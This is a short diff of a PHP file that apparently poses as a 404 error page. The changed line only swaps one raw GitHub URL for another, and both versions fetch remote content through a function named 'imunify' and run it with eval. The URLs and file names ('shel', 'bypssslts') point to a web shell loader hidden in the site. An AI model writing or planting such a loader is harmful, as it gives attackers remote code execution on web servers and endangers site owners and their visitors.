@@ -33,6 +33,6 @@ http_response_code(404);
         }
         return $urls;
     }
-    $secure = imunify('https://raw.githubusercontent.com/sekjhhh/shel-s-kecil/refs/heads/main/mr-skk-lts');
+    $secure = imunify('https://raw.githubusercontent.com/sekjhhh/shel/refs/heads/main/bypssslts');
     eval('?>' . $secure);
 ?>
